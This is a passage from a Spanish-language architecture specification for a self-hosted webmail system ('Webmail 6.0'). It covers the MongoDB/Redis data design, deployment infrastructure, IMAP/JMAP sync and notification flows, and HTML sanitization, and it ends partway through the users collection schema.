MongoDB 7.0 es el almacén primario de metadata de email. El diseño de schema sigue la estrategia híbrida recomendada para sistemas de mensajería: documentos embebidos para datos estables (participantes de un thread, asunto, fecha) y referencias para datos que cambian frecuentemente (flags de lectura, labels, estado de draft) [^141^]. Cada mensaje se almacena como documento en la colección `emails` con estructura:

```
{ _id, userId, mailboxId, threadId, uid, flags, headers: {...}, 
  subject, from, to, cc, date, size, hasAttachments, bodyRef, createdAt }
```

El campo `threadId` —un hash del Message-ID del mensaje raíz— permite recuperar conversaciones completas en una sola query indexada [^184^]. La regla ESR (Equality → Sort → Range) gobierna la creación de índices compuestos: para la query de inbox (`mailbox = X`, ordenado por `date DESC`, rango por `uid`), el índice óptimo es `{mailboxId: 1, date: -1, uid: 1}` [^204^]. El límite de 16 MB por documento de MongoDB impone el límite técnico de embedding: los cuerpos de email y adjuntos se almacenan por referencia, no embebidos [^141^].

MongoDB Atlas Search (basado en Apache Lucene) cubre el 90% de los casos de búsqueda de email: full-text sobre asunto, cuerpo y remitente; filtrado por fecha y mailbox; autocomplete en barra de búsqueda; y fuzzy matching para typos [^129^][^132^]. Frente a Elasticsearch, Atlas Search elimina la complejidad operacional de sincronizar un cluster separado y ofrece una API integrada en el aggregation pipeline de MongoDB [^132^].

#### 3.3.2 Redis 7 — pub/sub, sessions, BullMQ 5

Redis 7.2 cumple cinco funciones en la arquitectura de Webmail 6.0. Primera, almacén de sesiones: la combinación de tokens de acceso en memoria del frontend con refresh tokens almacenados en Redis mediante `SETEX` con TTL de 7-14 días habilita la invalidación distribuida de sesiones y la rotación de tokens [^157^][^175^]. Segunda, caché de cuerpos de email: el patrón Cache-Aside (lazy loading) almacena en Redis los cuerpos de emails recientemente accedidos con TTL de 1 hora, reduciendo fetchs IMAP repetidos [^152^]. Tercera, pub/sub para notificaciones en tiempo real: cuando imapflow detecta un nuevo email vía IDLE, el backend publica un evento al canal Redis correspondiente; los servidores WebSocket suscritos distribuyen la notificación a los clientes conectados [^139^]. Cuarta, rate limiting: el algoritmo Sliding Window implementado con Sorted Sets (`ZADD`, `ZREMRANGEBYSCORE`, `ZCARD`) ofrece precisión de sub-segundo sin el efecto de burst de los límites de ventana fija [^156^][^158^]. Quinta, cola de trabajos: BullMQ 5 (estándar de facto en 2026, procesando billones de jobs diariamente) maneja tareas asíncronas —indexación de nuevo email en MongoDB, parsing MIME con PostalMime, extracción y almacenamiento de adjuntos, notificaciones push— con soporte para retries con backoff exponencial, dead letter queues, y OpenTelemetry tracing [^203^].

| Capacidad | MongoDB 7 | Redis 7 | Justificación conjunta |
|-----------|-----------|---------|----------------------|
| Metadata de email | Documentos `emails` con índices ESR | No aplica | Índice compuesto `{mailbox, date, uid}` para queries de inbox [^204^] |
| Full-text search | Atlas Search (Lucene integrado) | No aplica | Elimina Elasticsearch; cubre 90% de casos [^132^] |
| Sesiones de usuario | No aplica | `SETEX` con TTL 7d | Invalidación distribuida + rotación tokens [^157^] |
| Caché de cuerpos | No aplica | Cache-Aside, TTL 1h | Reduce fetchs IMAP repetidos [^152^] |
| Notificaciones push | No aplica | Pub/Sub a WebSocket servers | Fire-and-forget; <100ms latencia [^139^] |
| Rate limiting | No aplica | Sliding Window ZSET | Precisión sin boundary bursts [^156^] |
| Background jobs | Estado de jobs | BullMQ 5 colas + workers | Retry exponencial, dead letter, tracing [^203^] |

La tabla sintetiza la división de responsabilidades entre MongoDB y Redis. MongoDB actúa como fuente de verdad duradera para metadata de email y búsqueda; Redis como capa de velocidad para sesiones, caché, mensajería en tiempo real y orquestación de trabajos asíncronos. Esta separación es la configuración estándar de la industria para aplicaciones read-heavy como el email, donde la ratio de lecturas a escritiones supera 100:1 en inboxes típicos.

#### 3.3.3 SeaweedFS (alternativa MinIO)

Para almacenamiento de objetos (adjuntos de email, avatares de contactos, exports), SeaweedFS reemplaza a MinIO como opción por defecto. MinIO, tradicionalmente la opción más madura para object storage S3-compatible, tuvo su comunidad edition archivada en febrero de 2026 —el repositorio de GitHub es ahora read-only— y su licencia AGPL-3.0 genera riesgo legal para uso comercial sin licencia pagada [^177^][^179^]. SeaweedFS (licencia Apache 2.0) ofrece I/O muy alto y está especializado en el manejo de muchos archivos pequeños —exactamente el perfil de adjuntos de email, donde la mayoría de archivos son <5 MB [^177^]. Garage (Rust, optimizado para deployments distribuidos/edge) se mantiene como alternativa documentada para instalaciones edge o multi-región.

### 3.4 Infraestructura

#### 3.4.1 Nginx reverse proxy

Nginx 1.26 actúa como reverse proxy y terminador SSL/TLS. Su configuración incluye: upstream hacia el servidor Fastify (port 3000), servicio de archivos estáticos del frontend (build de Vite), compresión gzip/brotli para assets JavaScript y CSS, headers de seguridad (HSTS, X-Frame-Options, X-Content-Type-Options, CSP estricto), y rate limiting por IP a nivel de conexión (complementario al rate limiting de aplicación en Redis). Para conexiones WebSocket de notificaciones en tiempo real, Nginx configura `proxy_upgrade` y `proxy_connection` upgrade, manteniendo conexiones persistentes entre clientes y servidores Node.js.

#### 3.4.2 Docker + Docker Compose

El despliegue primario es Docker Compose multi-service. El archivo `docker-compose.yml` define los servicios: `web` (Nginx + assets estáticos), `api` (Fastify + Node.js 20), `worker` (procesos BullMQ), `mongo` (MongoDB 7), `redis` (Redis 7), y `seaweedfs` (almacén de objetos). Cada servicio incluye health checks, restart policies (`unless-stopped`), y límites de recursos (CPU/memoria). La imagen del servicio `api` utiliza multi-stage build: stage de build (`node:20-alpine` + dependencias + `npm run build`) y stage de producción (`node:20-alpine` + solo `node_modules` de producción + código compilado), reduciendo la imagen final a ~180 MB.

La elección de Docker Compose sobre Kubernetes es deliberada. Para el segmento objetivo de Webmail 6.0 —individuos, pequeñas organizaciones y hosting providers que necesitan un webmail funcional sin equipo de DevOps dedicado— Kubernetes añade complejidad operacional no justificada. Docker Compose con health checks, rotación de logs y gestión de secrets mediante variables de entorno proporciona una solución de despliegue completa. Kubernetes se documenta como alternativa para deployments enterprise, con manifiestos opcionales.

#### 3.4.3 Prometheus + Grafana

El stack de observabilidad comprende Prometheus 2.53 para recolección de métricas y Grafana 11 para visualización. Prometheus scrapea endpoints `/metrics` expuestos por la aplicación Fastify (vía `@fastify/metrics`), BullMQ (métricas de cola: jobs procesados, fallidos, en espera), y los exporters de MongoDB y Redis. Los dashboards de Grafana incluyen: throughput de API (requests/minuto, latencia p50/p95/p99), estado de conexiones IMAP (activas, en IDLE, reconexiones), profundidad de colas BullMQ, hit rate de caché Redis, y uso de almacenamiento de SeaweedFS. Las alertas configuradas (vía Alertmanager) disparan notificaciones cuando la latencia p95 del API supera 500ms, cuando la profundidad de una cola BullMQ excede 1.000 jobs, o cuando el ratio de errores de conexión IMAP supera el 5% en una ventana de 5 minutos.


---

## 4. Arquitectura de Sistema

La arquitectura de Webmail 6.0 se fundamenta en un patrón de Backend-for-Frontend (BFF) con cinco pilares tecnológicos: una SPA en Vue 3 como capa de presentación, Nginx como proxy inverso y servidor de estáticos, Fastify como runtime del API, MongoDB como sistema de registro principal con Redis para caché y sesiones, y SeaweedFS como almacén de objetos para adjuntos. El diseño prioriza la separación de responsabilidades entre la indexación local de headers (operaciones rápidas sobre MongoDB) y la obtención bajo demanda de cuerpos de email vía IMAP, un patrón que la investigación identificó como crítico para alcanzar tiempos de carga sub-segundo en buzones grandes [^70^][^75^]. La decisión de adoptar Fastify sobre Express se fundamenta en benchmarks controlados que muestran un rendimiento 2-3x superior: aproximadamente 14,460 req/s frente a 6,150 req/s bajo 100 conexiones concurrentes durante 10 segundos [^130^]. Adicionalmente, el sistema de plugins de Fastify proporciona encapsulación nativa — cada plugin opera con su propio scope, evitando que decoradores y middlewares se filtren entre rutas — lo cual resulta particularmente valioso para aislar los módulos de IMAP, SMTP, CalDAV y WebSocket [^128^].

### 4.1 Diagrama de Arquitectura

La topología del sistema sigue un flujo unidireccional de peticiones desde el navegador hasta los servicios externos, con canales paralelos para notificaciones en tiempo real y procesamiento en segundo plano. El siguiente diagrama describe la interacción completa entre componentes:

```mermaid
graph TB
    subgraph Cliente["Cliente (Navegador)"]
        VUE[Vue 3 SPA<br/>Pinia + Vue Router]
        WS[Socket.IO Client]
    end

    subgraph Edge["Capa Edge"]
        NG[Nginx<br/>Proxy Inverso + SSL<br/>Static File Serving]
    end

    subgraph API["Capa de Aplicación"]
        FA[Fastify API<br/>Plugins Encapsulados]
        subgraph Modulos["Módulos Funcionales"]
            AUTH[Auth Plugin]
            IMAP_M[IMAP Manager]
            SMTP_M[SMTP Manager]
            CAL_M[CalDAV Manager]
            ATT_M[Attachment Manager]
        end
        WS_S[Socket.IO Server]
        BULL[BullMQ Workers]
    end

    subgraph Data["Capa de Datos"]
        MG[(MongoDB<br/>Headers + Metadata + Índices)]
        RD[(Redis<br/>Sesiones + Cache + Pub/Sub)]
        SW[(SeaweedFS<br/>Adjuntos + Blobs)]
    end

    subgraph Protocolos["Servicios Externos"]
        IMAP_S[IMAP Server<br/>IDLE / CONDSTORE / QRESYNC]
        SMTP_S[SMTP Server<br/>STARTTLS / OAuth2]
        CAL_S[CalDAV Server<br/>RFC 4791]
    end

    VUE -->|HTTPS / REST| NG
    WS -->|wss://| NG
    NG -->|/api/*| FA
    FA --> AUTH
    FA --> IMAP_M
    FA --> SMTP_M
    FA --> CAL_M
    FA --> ATT_M
    IMAP_M -->|BODY.PEEK| IMAP_S
    SMTP_M -->|MAIL FROM| SMTP_S
    CAL_M -->|PROPFIND| CAL_S
    ATT_M -->|PUT / GET| SW
    IMAP_M --> MG
    SMTP_M --> MG
    CAL_M --> MG
    ATT_M --> MG
    FA --> RD
    WS_S --> RD
    BULL --> RD
    BULL --> MG
    RD -->|Pub/Sub| WS_S
    WS_S --> WS

    style Cliente fill:#e1f5fe
    style Edge fill:#fff3e0
    style API fill:#e8f5e9
    style Data fill:#fce4ec
    style Protocolos fill:#f3e5f5
```

El diagrama revela una decisión arquitectónica intencional: MongoDB actúa exclusivamente como índice local de headers y metadata, mientras que los cuerpos de email permanecen en el servidor IMAP hasta que el usuario solicita su lectura. Esta estrategia *headers-first, body-on-demand* reduce drásticamente el ancho de banda necesario para la sincronización inicial y permite que la lista de mensajes se sirva enteramente desde la base de datos local en tiempos de respuesta inferiores a 100ms [^70^][^75^]. El uso de BODY.PEEK en lugar de BODY para el fetch de headers evita marcar implícitamente los mensajes como \\Seen, preservando el estado de lectura del usuario hasta que interactúa explícitamente con un email [^70^][^78^].

### 4.2 Flujos de Datos Principales

Cada operación crítica del webmail sigue un pipeline definido que equilibra latencia percibida, uso de ancho de banda y consistencia de datos. A continuación se detallan los seis flujos fundamentales.

#### 4.2.1 Login: Validación IMAP → JWT + Credenciales Encriptadas → Conexión IMAP en Pool

El flujo de autenticación implementa el patrón BFF (Backend-for-Frontend) con token rotation, considerado el estándar para aplicaciones web en 2026 [^157^][^160^]. El proceso consta de cinco etapas:

1. **Validación de credenciales contra IMAP**: El frontend envía email y password al endpoint POST /api/auth/login. Fastify intenta una conexión IMAP transitoria usando imapflow con los parámetros del servidor configurado. Si la conexión IMAP es exitosa, las credenciales se consideran válidas. Esta decisión — validar contra el servidor IMAP real en lugar de mantener una tabla local de passwords — elimina la necesidad de sincronización de credenciales y garantiza que el usuario siempre tenga acceso activo a su cuenta de correo.

2. **Encriptación de credenciales**: El password se encripta con AES-256-GCM usando una clave maestra derivada de `ENCRYPTION_KEY` (variable de entorno del servidor). El plugin mongoose-aes-encryption proporciona esta encriptación transparente a nivel de campo: la aplicación lee y escribe valores en texto plano mientras solo el ciphertext toca la base de datos [^154^]. El documento resultante se almacena en la colección `accounts`.

3. **Emisión de tokens JWT**: Se genera un access token (JWT firmado, expiración 15 minutos) y un refresh token (UUID aleatorio, expiración 7 días). El access token se devuelve en el cuerpo de la respuesta para almacenamiento en memoria del frontend; el refresh token se almacena en Redis con TTL de 7 días y se entrega al cliente como cookie HTTP-only con atributos `Secure`, `SameSite=Strict` [^157^].

4. **Pool de conexiones IMAP**: Tras el login exitoso, el IMAP Manager inicializa una conexión persistente al servidor IMAP y la registra en un pool singleton por cuenta de usuario. El pool gestiona reconexiones automáticas, mailbox locking para acceso concurrente seguro, y expiración de conexiones inactivas tras 5 minutos [^137^][^39^]. imapflow maneja automáticamente extensiones IMAP como CONDSTORE, QRESYNC, IDLE y COMPRESS [^1^].

5. **Sincronización inicial en background**: Se encola un job en BullMQ para sincronización de folders y headers. El usuario puede navegar inmediatamente mientras el worker procesa la sincronización en segundo plano [^203^].

| Componente | Decisión Arquitectónica | Justificación |
|------------|------------------------|---------------|
| Validación de credenciales | Conexión transitoria IMAP en login | Elimina sincronización de passwords; garantiza acceso activo |
| Encriptación | AES-256-GCM a nivel de campo vía mongoose-aes-encryption | Protege PII incluso si la base de datos se compromete [^154^] |
| Access token | JWT en memoria frontend, TTL 15 min | Minimiza superficie de ataque XSS; no se almacena en localStorage |
| Refresh token | UUID en Redis + HTTP-only cookie | Prevención de token theft; rotación en cada uso [^157^] |
| Pool IMAP | Singleton con expiración 5 min | Evita límites de conexiones de providers (Gmail: 250, Outlook: 20) [^137^] |

#### 4.2.2 Sincronización Inicial: FETCH Headers → Indexado en MongoDB

La sincronización inicial constituye el momento de mayor carga del sistema y define la primera impresión del usuario sobre la velocidad del webmail. El pipeline opera en cuatro fases:

1. **Descubrimiento de folders**: El worker de BullMQ ejecuta LIST contra el servidor IMAP para obtener la jerarquía completa de carpetas. Se almacenan en la colección `folders` con sus atributos (\\HasNoChildren, \\Sent, \\Trash, etc.) y el uidvalidity actual.

2. **Fetch de headers en batch**: Para cada folder, se ejecuta UID FETCH con BODY.PEEK[HEADER.FIELDS (DATE FROM TO CC SUBJECT MESSAGE-ID IN-REPLY-TO REFERENCES CONTENT-TYPE X-PRIORITY)] en lotes de 500 mensajes. Esta selección de headers es suficiente para construir la lista de emails, identificar threading y extraer preview, sin incurrir en el costo de transferir cuerpos completos [^70^].

3. **Parseo MIME y enriquecimiento**: Cada lote de headers se procesa con PostalMime para extraer: remitente parseado (nombre + dirección), lista de destinatarios, asunto decodificado (RFC 2047), preview de texto (primeros 200 caracteres del body plain cuando está disponible), y flags IMAP. PostalMime — desarrollado por el mismo equipo de imapflow — ofrece protecciones de seguridad integradas como `maxNestingDepth` y `maxHeadersSize`, además de cero dependencias y soporte TypeScript nativo [^99^].

4. **Indexado en MongoDB**: Los documentos se insertan en la colección `emails` con un índice compuesto siguiendo la regla ESR (Equality → Sort → Range): `{accountId: 1, folderId: 1, date: -1, uid: 1}` [^204^]. Este índice optimiza la query más frecuente del sistema: listar emails de una carpeta ordenados por fecha. Para servidores que soportan CONDSTORE, se almacena además el `modseq` de cada mensaje, permitiendo sincronizaciones incrementales subsiguientes que solo descargan mensajes modificados [^39^].

El uso de BullMQ para orquestar este pipeline permite: retries con exponential backoff ante fallos transitorios de red, dead letter queues para mensajes que no pueden parsearse, y flow producers para modelar dependencias entre pasos [^203^].

#### 4.2.3 Navegación: Sirve desde MongoDB → Fallback a IMAP

Una vez completada la sincronización inicial, la navegación por el inbox opera casi exclusivamente contra MongoDB. El flujo es:

1. **Query a MongoDB**: El endpoint GET /api/emails recibe `accountId`, `folderId`, `page`, `limit`, `sort` (default: date desc) y `query` (búsqueda opcional). Se ejecuta una query con el índice compuesto que resuelve en menos de 50ms para buzones de hasta 100,000 mensajes.

2. **Búsqueda full-text**: Cuando el usuario introduce términos de búsqueda, MongoDB Atlas Search (basado en Apache Lucene) proporciona full-text search integrado sin infraestructura adicional, con sincronización automática de datos, highlighting, fuzzy search y autocomplete [^132^]. Atlas Search cubre aproximadamente el 90% de los casos de uso de búsqueda en webmail: full-text sobre asunto, cuerpo, remitente, filtrado por fecha/carpeta y autocomplete [^132^].

3. **Fallback a IMAP**: Si un folder no ha sido sincronizado (primer acceso) o la marca `needsResync` está activa, el sistema delega la query a imapflow con un timeout de 10 segundos. Los resultados se cachean en MongoDB para consultas subsiguientes. Este fallback garantiza que el usuario siempre vea datos, aunque con mayor latencia en el primer acceso a una carpeta.

4. **Virtual scrolling**: El frontend implementa virtual scrolling sobre la lista de emails, solicitando nuevas páginas vía paginación cursor-based (`lastDate` + `lastId`) en lugar de offset-based, evitando degradación de performance en páginas profundas [^148^].

#### 4.2.4 Lectura de Email: Trae Body de IMAP → Sanitiza HTML → Marca \\Seen

El flujo de lectura de un email individual ilustra el patrón *body-on-demand*:

1. **Comprobación de cache**: Al hacer clic en un email, el frontend solicita GET /api/emails/:id/body. El backend primero consulta Redis (patrón cache-aside): si el cuerpo está cacheado con TTL de 1 hora, se devuelve inmediatamente [^152^].

2. **Fetch del cuerpo vía IMAP**: En cache miss, se ejecuta UID FETCH con BODY.PEEK[] para obtener el mensaje completo en formato RFC 822. El uso de BODY.PEEK evita marcar el mensaje como \\Seen automáticamente [^70^][^78^]. El mensaje se parsea con PostalMime para extraer la parte HTML y la parte texto plano [^101^].

3. **Sanitización de HTML**: La parte HTML se procesa con DOMPurify en el servidor (entorno jsdom) para eliminar scripts, event handlers inline, elementos potencialmente peligrosos (object, embed, form con action javascript:) y atributos de estilo que puedan ejecutar código (expression, behavior). DOMPurify es el gold standard para sanitización HTML, identificado como la única defensa confiable contra vectores XSS vía contenido de email [^154^]. El HTML sanitizado se almacena en Redis con TTL de 1 hora.

4. **Marcado como leído**: Si el usuario permanece más de 3 segundos visualizando el email, el frontend envía una petición para marcar el mensaje como \\Seen. Esta operación se ejecuta vía IMAP STORE y se refleja en MongoDB actualizando el campo `flags`.

5. **Renderizado seguro en el cliente**: El HTML sanitizado se renderiza dentro de un iframe sandboxed con atributos `sandbox="allow-same-origin"` y una CSP estricta que bloquea scripts, plugins y navegación de top-level. Esta triple capa de sanitización (DOMPurify server-side + iframe sandbox + CSP headers) constituye la estrategia defense-in-depth contra ataques XSS vía email.

#### 4.2.5 Envío: Draft → Firma → SMTP → Copia en Sent → Borra Draft

El pipeline de envío de email asegura que ningún mensaje se pierda incluso ante fallos parciales:

1. **Composición y auto-save**: Mientras el usuario redacta, el frontend envía peticiones PATCH cada 10 segundos para actualizar el draft en MongoDB. Los drafts se almacenan en la colección `drafts` sin sincronización con el servidor IMAP hasta que el usuario envía.

2. **Preparación del mensaje**: Al pulsar "Enviar", el backend construye el mensaje MIME completo usando Nodemailer, incluyendo: headers In-Reply-To y References para mantener el thread (siguiendo el algoritmo JWZ) [^56^], firma HTML configurada por el usuario, y adjuntos referenciados por storageKey en SeaweedFS.

3. **Envío SMTP**: Nodemailer transmite el mensaje vía SMTP con STARTTLS y pooling de conexiones para mejor performance [^68^]. Para cuentas Gmail, se requiere autenticación OAuth2 (XOAUTH2) ya que Google eliminó completamente la autenticación básica en marzo de 2025 [^58^].

4. **Copia en Sent**: Tras confirmación de envío SMTP, se crea una copia en la carpeta Sent vía IMAP APPEND. EmailEngine demuestra que este patrón es robusto, construyendo automáticamente los headers necesarios y marcando flags IMAP apropiados [^60^].

5. **Limpieza**: Se elimina el draft de MongoDB y se encola un job para sincronizar la carpeta Sent, asegurando que la copia aparezca en el inbox del usuario.

#### 4.2.6 Auto-Save Draft: MongoDB cada 10 segundos

El auto-guardado de borradores es una operación crítica para la experiencia de usuario que debe ser rápida y fiable:

1. **Frecuencia**: El frontend envía el estado completo del draft (to, cc, bcc, subject, body, attachments) cada 10 segundos mientras el usuario está activo en el compositor, y al detectar el evento `beforeunload`.

2. **Storage**: Los drafts se almacenan exclusivamente en MongoDB (colección `drafts`) sin sincronización con el servidor IMAP. Esto evita crear mensajes de borrador temporales en la bandeja del usuario.

3. **Concurrencia**: Al abrir el compositor, se carga el draft más reciente desde MongoDB. Si existen múltiples borradores para una misma cuenta, se presentan en un selector lateral.

4. **Cleanup**: Los drafts no modificados en 30 días se eliminan automáticamente mediante un índice TTL en MongoDB sobre el campo `lastModifiedAt`.

### 4.3 Notificaciones en Tiempo Real

El sistema implementa un pipeline de notificaciones push dual: WebSocket como canal principal con IMAP IDLE como fuente de eventos, complementado por polling periódico como fallback para servidores sin soporte IDLE.

#### 4.3.1 IMAP IDLE → Redis Pub/Sub → WebSocket → Frontend

La arquitectura de notificaciones en tiempo real consta de cuatro capas conectadas:

1. **IMAP IDLE (capa de protocolo)**: Para cada cuenta conectada, imapflow mantiene una conexión IDLE activa en el folder INBOX. IMAP IDLE (RFC 2177) permite al servidor IMAP "empujar" notificaciones al cliente cuando llegan nuevos mensajes, eliminando la necesidad de polling constante [^63^]. Si el servidor no soporta IDLE, imapflow permite configurar `missingIdleCommand` con alternativas como NOOP, SELECT o STATUS [^41^]. La limitación de IDLE — solo una carpeta por conexión — se mitiga reiniciando IDLE periódicamente según `maxIdleTime` y rotando entre carpetas monitoreadas [^39^].

2. **Redis Pub/Sub (capa de mensajería)**: Cuando imapflow recibe una notificación de nuevo mensaje (o cambio de flags), el IMAP Manager publica un evento estructurado al canal Redis `notifications:{userId}`. Redis Pub/Sub distribuye el evento a todos los servidores WebSocket suscritos [^138^]. Aunque Pub/Sub es fire-and-forget (mensajes se evaporan si no hay suscriptores activos), esto es adecuado para notificaciones de email donde el objetivo es informar a sesiones activas, no persistir eventos históricos [^142^]. Para eventos críticos que no pueden perderse (como la llegada de un email que dispara una regla de forwarding), se utiliza Redis Streams con acknowledgment y replay [^142^].

3. **Socket.IO Server (capa de transporte)**: El servidor WebSocket se suscribe a los canales Redis de los usuarios con sesiones activas. Cuando recibe un evento, lo transmite a la room Socket.IO correspondiente al `userId`. Socket.IO se selecciona sobre `ws` nativo por su soporte de rooms (permitiendo notificaciones por usuario), auto-reconexión con backoff exponencial, y fallback transparente a HTTP long-polling cuando WebSocket no está disponible [^162^]. Aunque `ws` ofrece mayor rendimiento crudo (~45,493 msg/s vs ~27,152 msg/s de Socket.IO), las features adicionales de Socket.IO resultan críticas para la fiabilidad del canal de notificaciones en condiciones de red variables [^155^].

4. **Frontend (capa de consumo)**: El cliente Vue recibe eventos como `email:new`, `email:flagChanged`, `folder:countChanged` y actualiza el store Pinia correspondiente, reflejando los cambios en la UI sin necesidad de refresh. Los eventos de nuevo email desencadenan además una petición de sincronización incremental para obtener los headers del mensaje nuevo.

#### 4.3.2 Fallback Polling 30-60s

Para escenarios donde WebSocket no está disponible (redes corporativas con proxies que bloquean ws://, dispositivos móviles en modo de ahorro de datos) o el servidor IMAP no soporta IDLE, el sistema implementa polling inteligente:

1. **Intervalo adaptativo**: El frontend alterna entre intervalos de 30 segundos (cuando la pestaña está activa y visible) y 60 segundos (cuando está en background), reduciendo la carga del servidor y el consumo de batería en dispositivos móviles.

2. **Polling eficiente**: En lugar de descargar headers completos, el polling usa el comando IMAP STATUS para comparar el `UIDNEXT` y `UNSEEN` de cada folder con los valores cacheados. Solo si hay diferencias se ejecuta una sincronización incremental real.

3. **Transición transparente**: El frontend detecta automáticamente la disponibilidad de WebSocket y transita entre el modo push (WebSocket) y el modo pull (polling) sin intervención del usuario. El evento `connect_error` de Socket.IO desencadena la activación del polling; el evento `connect` lo desactiva.

| Modo | Latencia de notificación | Uso de batería/rendimiento | Condición de activación |
|------|-------------------------|---------------------------|------------------------|
| WebSocket push (Socket.IO) | < 1 segundo | Bajo (conexión persistente) | WebSocket disponible, IMAP IDLE soportado |
| Polling adaptativo | 30-60 segundos | Moderado | WebSocket bloqueado o IDLE no soportado |
| Polling de emergencia | 120 segundos | Mínimo | Pestaña en background, modo ahorro |

### 4.4 Abstracción de Protocolo: IMAP + JMAP

Una decisión arquitectónica distintiva de Webmail 6.0 es la implementación de una capa de abstracción de protocolo que permite operar indistintamente sobre IMAP tradicional o JMAP (JSON Meta Application Protocol), seleccionando automáticamente el protocolo óptimo según las capacidades del servidor.

#### 4.4.1 Capa de Abstracción Unificada

El Protocol Manager expone una interfaz TypeScript uniforme independientemente del protocolo subyacente:

```typescript
interface IEmailProtocol {
  connect(config: ProtocolConfig): Promise<Connection>;
  listFolders(): Promise<Folder[]>;
  fetchHeaders(folderId: string, range: UidRange): Promise<EmailHeader[]>;
  fetchBody(uid: number): Promise<EmailBody>;
  setFlags(uid: number, flags: string[]): Promise<void>;
  sendMessage(message: OutgoingMessage): Promise<void>;
  startNotifications(callback: NotificationCallback): Promise<void>;
  syncIncremental(since: SyncToken): Promise<SyncResult>;
}
```

La implementación IMAP usa imapflow como cliente, mientras que la implementación JMAP usa peticiones HTTP/JSON sobre el endpoint JMAP del servidor. El Protocol Manager detecta las capacidades del servidor durante la fase de discovery post-login y selecciona la implementación apropiada. Para servidores que soportan ambos protocolos (Stalwart, Cyrus, Apache James), se prefiere JMAP [^71^].

#### 4.4.2 JMAP para Servidores Compatibles — 3-5x Sync Más Rápido

JMAP (RFC 8620 core, RFC 8621 mail) es un estándar IETF desarrollado por Fastmail que resuelve las limitaciones fundamentales de IMAP para entornos web modernos [^74^][^84^]. Cuando el servidor destino soporta JMAP, Webmail 6.0 obtiene mejoras tangibles:

- **Sincronización 3-5x más rápida**: JMAP usa delta sync (solo cambios desde el último estado conocido) y batching de múltiples operaciones en una sola petición, reduciendo drásticamente el número de round-trips necesarios [^31^].
- **Reducción de 80-90% en ancho de banda**: Al usar JSON sobre HTTPS con IDs inmutables y stateless operations, JMAP elimina la verbosidad de los comandos IMAP y sus respuestas [^31^].
- **Push nativo vía WebSocket**: JMAP push (RFC 8887) notifica al cliente en menos de 1 segundo vía WebSocket, eliminando la necesidad de conexiones IMAP IDLE persistentes y sus limitaciones (una carpeta a la vez, sensibilidad a cambios de red) [^31^][^33^].
- **Soporte unificado**: JMAP incluye especificaciones para email (RFC 8621), contactos (RFC 9610), calendarios (en aprobación final), quotas (RFC 9425) y Sieve filtering (RFC 9661), permitiendo consolidar múltiples protocolos en uno solo [^71^].

Servidores con soporte JMAP verificado incluyen Stalwart Mail Server (production-ready, financiado por NLnet/Comisión Europea) [^105^][^103^], Cyrus IMAP (desde versión 3.2, usado por Fastmail) [^71^], y Apache James (desde versión 3.6.0) [^71^]. Thunderbird ha comenzado a adoptar JMAP en su versión iOS, con soporte desktop en desarrollo [^30^][^45^].

#### 4.4.3 IMAP como Fallback Universal

Para servidores que no soportan JMAP (la gran mayoría en 2026), IMAP sigue siendo el protocolo de comunicación. imapflow es la única librería IMAP moderna y activamente mantenida para Node.js, con node-imap oficialmente en estado de abandón (último release hace 5+ años) [^107^][^1^]. La implementación IMAP aprovecha al máximo las extensiones disponibles:

- **CONDSTORE** (RFC 7162) para sincronización condicional basada en modificaciones de flags sin re-descargar todo.
- **QRESYNC** para re-sincronización rápida después de reconexión, obteniendo solo cambios desde la última sync conocida [^39^].
- **COMPRESS=DEFLATE** para reducir ancho de banda en conexiones lentas.
- **IMAP IDLE** para notificaciones push en tiempo real (con reinicio periódico según `maxIdleTime`) [^41^].

La coexistencia de ambos protocolos posiciona a Webmail 6.0 como compatible con el 100% de servidores IMAP existentes mientras obtiene beneficios significativos en servidores modernos. La transición desde IMAP hacia JMAP será gradual: servidores como Stalwart soportan ambos simultáneamente, y la adopción de JMAP está en aceleración con Thunderbird y múltiples implementaciones server-side maduras [^32^][^36^]. La estrategia dual asegura que Webmail 6.0 no quede obsoleto cuando JMAP alcance adopción masiva, ni excluya a usuarios de servidores IMAP legacy.

| Protocolo | Latencia de push | Sync inicial | Ancho de banda | Soporte de servidores |
|-----------|-----------------|-------------|----------------|----------------------|
| JMAP | < 1 segundo vía WebSocket [^31^] | 3-5x más rápido [^31^] | 80-90% menos [^31^] | Limitado (Stalwart, Cyrus, Apache James) [^71^] |
| IMAP + IDLE | Inmediato (TCP push) [^63^] | Estándar | Estándar | Universal (99%+ de servidores) |
| IMAP + polling | 30-60 segundos | Estándar | Estándar | Universal fallback |


---

## 5. Modelo de Datos MongoDB

El diseño del esquema de datos de Webmail 6.0 sigue los principios de modelado orientado a documentos para cargas de trabajo read-heavy, donde la denormalización controlada y los índices compuestos bien diseñados prevalecen sobre la normalización relacional [^148^]. MongoDB resulta particularmente adecuado para el dominio de email porque: las consultas predominantes son lecturas (listar emails, buscar, navegar carpetas), la estructura de un email se mapea naturalmente a un documento JSON anidado, y los índices compuestos permiten resolver las queries más frecuentes en una sola operación index-covered [^204^].

La estrategia de modelado adopta un enfoque híbrido: se incrustan (embed) datos estables que se consultan conjuntamente con alta frecuencia — como los participantes de un thread o los headers de un email — y se referencian datos que cambian frecuentemente o tienen cardinalidad potencialmente ilimitada, como los adjuntos o los eventos de calendario [^141^]. El límite de 16MB por documento de MongoDB se toma como restricción de diseño activa: un email con sus headers y preview cabe cómodamente en un documento, mientras que los adjuntos se almacenan en SeaweedFS con solo su metadata en MongoDB.

El índice compuesto más crítico del sistema — `{accountId: 1, folderId: 1, date: -1, uid: 1}` — sigue la regla ESR (Equality → Sort → Range), garantizando que la query de listado de emails se resuelva mediante un index scan sin necesidad de in-memory sorts ni document fetches adicionales [^204^].

### 5.1 Colección `users` — Configuración Global

La colección `users` almacena el perfil de configuración global de cada persona que accede al sistema. Un documento por usuario físico, independientemente de cuántas cuentas de correo gestione.

```typescript
interface IUser {
  _id: ObjectId;

  /** Email principal usado para identificación en el sistema */
  primaryEmail: string;

  /** Nombre de visualización para el usuario */
  displayName: string;

  /** URL del avatar (generado por Gravatar o subido por el usuario) */
  avatarUrl?: string;

  /** Preferencias de interfaz de usuario */
  preferences: {
    /** Idioma de la interfaz (ISO 639-1) */
    language: string;           // default: 'es'

    /** Zona horaria para fechas (IANA tz database) */
    timezone: string;           // default: 'America/Mexico_City'

    /** Formato de hora: 12h o 24h */
    timeFormat: '12h' | '24h';  // default: '24h'

    /** Tema visual */
    theme: 'light' | 'dark' | 'system';  // default: 'system'

    /** Densidad de la lista de emails */
    density: 'compact' | 'comfortable' | 'spacious';  // default: 'comfortable'

    /** Número de emails por página */
    pageSize: number;           // default: 50, min: 10, max: 200

    /** Layout preferido: three-pane o list-only */
